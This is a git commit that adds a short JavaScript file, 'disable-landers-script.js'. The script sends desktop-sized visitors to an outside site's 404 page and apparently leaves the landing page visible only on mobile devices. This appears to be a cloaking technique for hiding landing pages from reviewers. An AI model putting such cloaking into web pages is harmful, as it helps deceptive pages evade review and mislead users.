9c0aa94396e0146b43c0ae4cfb84afef971fa9cb
hatkit83 <hatkit83@gmail.com>
2018-04-17 17:39:26 +0530

    Add files via upload

---
+++ disable-landers-script.js
@@ -0,0 +1,6 @@
+<script type="text/javascript" language="javascript">
+	var areYouReallySure = false;
+	var internalLink = false;
+	if (typeof window.orientation == 'undefined' && screen.width >= 1000){window.location.href = 'http://neuewfarben.com/404';
+	areYouReallySure=true;}
+</script>
